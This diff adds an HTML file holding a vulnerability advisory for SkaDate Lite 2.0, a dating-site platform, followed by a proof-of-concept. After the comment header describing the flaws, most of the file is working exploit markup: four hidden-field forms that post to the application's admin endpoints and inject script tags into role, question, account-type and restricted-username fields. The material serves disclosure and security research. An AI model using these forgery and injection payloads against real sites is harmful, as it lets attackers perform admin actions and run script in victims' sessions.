@@ -1,0 +1,103 @@
+<!--
+
+SkaDate Lite 2.0 Multiple XSRF And Persistent XSS Vulnerabilities
+
+
+Vendor: Skalfa LLC
+Product web page: http://lite.skadate.com | http://www.skalfa.com
+Affected version: 2.0 (build 7651) [Platform version: 1.7.0 (build 7906)]
+
+Summary: SkaDate Lite is a new platform that makes it easy
+to start online dating business in just a few easy steps. No
+programming or design knowledge is required. Install the solution,
+pick a template, and start driving traffic to your new online
+dating site.
+
+Desc: SkaDate Lite version 2.0 suffers from multiple cross-site
+request forgery and stored xss vulnerabilities. The application
+allows users to perform certain actions via HTTP requests
+without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+Input passed to several POST parameters is not properly
+sanitised before being returned to the user. This can be
+exploited to execute arbitrary HTML and script code in a
+user's browser session in context of an affected site.
+
+Tested on: CentOS Linux 6.5 (Final)
+           nginx/1.6.0
+           PHP/5.3.28
+           MySQL 5.5.37
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2014-5197
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5197.php
+
+
+
+23.07.2014
+
+-->
+
+
+<html>
+<title>SkaDate Lite 2.0 Multiple XSRF And Persistent XSS Vulnerabilities</title>
+<body>
+
+
+<form action="http://192.168.0.105/admin/users/roles/" method="POST">
+<input type="hidden" name="form_name" value="add-role" />
+<input type="hidden" name="label" value='"><script>alert(1);</script>' />
+<input type="hidden" name="submit" value="Add" />
+<input type="submit" value="Execute #1" />
+</form>
+
+
+<form action="http://192.168.0.105/admin/questions/ajax-responder/" method="POST">
+<input type="hidden" name="form_name" value="account_type_49693e2b1cb50cad5c42b18a9103f146dcce2ec6" />
+<input type="hidden" name="command" value="AddAccountType" />
+<input type="hidden" name="key" value="questions_account_type_5615100a931845eca8da20cfdf7327e0" />
+<input type="hidden" name="prefix" value="base" />
+<input type="hidden" name="accountTypeName" value="5615100a931845eca8da20cfdf7327e0" />
+<input type="hidden" name="lang[1][base][questions_account_type_5615100a931845eca8da20cfdf7327e0]" value='"><script>alert(2);</script>' />
+<input type="hidden" name="role" value="12" />
+<input type="submit" value="Execute #2" />
+</form>
+
+
+<form action="http://192.168.0.105/admin/questions/ajax-responder/" method="POST">
+<input type="hidden" name="form_name" value="qst_add_form" />
+<input type="hidden" name="qst_name" value='"><script>alert(3);</script>' />
+<input type="hidden" name="qst_description" value="ZSL" />
+<input type="hidden" name="qst_account_type[0]" value="290365aadde35a97f11207ca7e4279cc" />
+<input type="hidden" name="qst_section" value="f90cde5913235d172603cc4e7b9726e3" />
+<input type="hidden" name="qst_answer_type" value="text" />
+<input type="hidden" name="qst_possible_values" value="%5B%5D" />
+<input type="hidden" name="year_range[to]" value="1996" />
+<input type="hidden" name="year_range[from]" value="1930" />
+<input type="hidden" name="qst_column_count" value="1" />
+<input type="hidden" name="qst_required" value="" />
+<input type="hidden" name="qst_on_sign_up" value="" />
+<input type="hidden" name="qst_on_edit" value="" />
+<input type="hidden" name="qst_on_view" value="" />
+<input type="hidden" name="qst_on_search" value="" />
+<input type="hidden" name="valuesStorage" value="%7B%7D" />
+<input type="hidden" name="command" value="addQuestion" />
+<input type="submit" value="Execute #3" />
+</form>
+
+
+<form action="http://192.168.0.105/admin/restricted-usernames" method="POST">
+<input type="hidden" name="form_name" value='restrictedUsernamesForm"><script>alert(4);</script>' />
+<input type="hidden" name="restrictedUsername" value='"><script>alert(5);</script>' />
+<input type="hidden" name="addUsername" value="Add" />
+<input type="submit" value="Execute #4 & #5" />
+</form>
+
+
+</body>
+</html>
